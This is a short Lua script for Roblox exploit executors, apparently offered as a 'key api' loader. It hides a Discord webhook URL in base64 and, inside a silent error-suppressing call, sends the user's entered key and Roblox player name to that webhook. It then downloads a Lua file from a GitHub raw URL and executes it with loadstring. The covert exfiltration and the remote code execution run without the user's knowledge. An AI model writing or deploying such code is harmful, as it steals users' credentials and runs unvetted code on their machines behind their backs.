local webh = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwMDc1ODE2MTU1MzY0ODg1MTkvYkEzd2VMMERUVElwdGRmUXl6NU1ndmhPT29ONHpMUlRDa0JqUGhhX2N5RW9mSXU4SWNfRGVrcUJrUjRVU2ZWLWF1UGM="

pcall(function()
local data = 
	{
		["content"] = "",
		["embeds"] = {{
			["title"] = "** daskolik key api v0.1**",
			["description"] = "**key api daskolik**",
			["type"] = "rich",
			["color"] = tonumber(0xffffff),
			["fields"] = {
				{
					["name"] = "Your Key",
					["value"] = _G.gonderilenkey ,
					["inline"] = true
				},
				{
					["name"] = "Name",
					["value"] = game.Players.LocalPlayer.Name,
					["inline"] = true
				}
			}
		}}
	}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/daskolik/scriptzone/repo.ichbinmusti.git/main.lua"))()
